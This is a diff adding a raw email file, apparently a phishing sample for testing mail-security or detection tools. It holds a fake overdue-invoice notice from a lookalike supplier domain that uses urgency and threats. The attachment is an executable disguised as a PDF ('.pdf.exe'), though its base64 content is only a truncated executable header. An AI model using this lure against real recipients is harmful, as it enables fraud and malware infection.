@@ -1,0 +1,30 @@
+From: "Accounts Receivable - Office Supplies Ltd" <billing@supplier-portal-docs.com>
+To: accounting@company.com
+Subject: OVERDUE INVOICE #INV-98231 - Immediate Payment Required
+Date: Tue, 24 Nov 2026 09:30:00 +0000
+Message-ID: <inv98231@supplier-portal-docs.com>
+Authentication-Results: mx.company.com; spf=pass; dkim=pass
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_98231"
+
+------=_Part_98231
+Content-Type: text/plain; charset="UTF-8"
+
+Dear Valued Client,
+
+Your payment for invoice #INV-98231 is now 30 days overdue. A late fee has been assessed.
+Please inspect the attached detailed invoice calculation sheet.
+
+Please remit payment within 48 hours to avoid credit reporting.
+
+Regards,
+Billing Dept
+------=_Part_98231
+Content-Type: application/octet-stream; name="Invoice_Statement_98231.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_Statement_98231.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAA
+------=_Part_98231--
